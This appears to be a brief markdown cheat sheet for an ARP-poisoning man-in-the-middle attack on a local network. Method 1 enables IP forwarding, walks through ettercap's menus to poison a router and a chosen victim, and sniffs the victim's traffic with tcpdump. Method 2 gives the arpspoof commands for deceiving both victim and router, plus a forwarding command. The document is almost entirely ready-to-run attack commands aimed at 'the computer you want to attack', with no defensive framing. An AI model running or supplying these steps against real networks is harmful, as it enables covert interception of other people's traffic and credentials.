# Method 1
1) enable forwarding   
```
sysctl -w net.ipv4.ip_forward=1
```
2) then go the the graphical ettercap.  
there click on sinff --> unified sniff --> wlan0  
then click on targets --> current targets  
then pick target one as the router and target 2 as the computer you want to attack  
then click mitm --> arp poisoning --> sniff remote connections  
then run:
```
tcpdump -i wlan0 -n port <port_number> and host <host_name>
```
<br>
<br>

# Method 2

## <ins>arpspoof attack</ins>  
<ins>fool the victim</ins>
```
arpspoof -i <interface of my machine> -t <target ip> <gateway>
```
<ins>fool the router</ins>
```
arpspoof -i <interface of my machine> -t <gateway> <target ip>
```
now you need to enable port forwarding for your machine so it could send the packets from himself to the router  
```
echo 1 > /proc/sys/net/ipv4/ip_forward 
```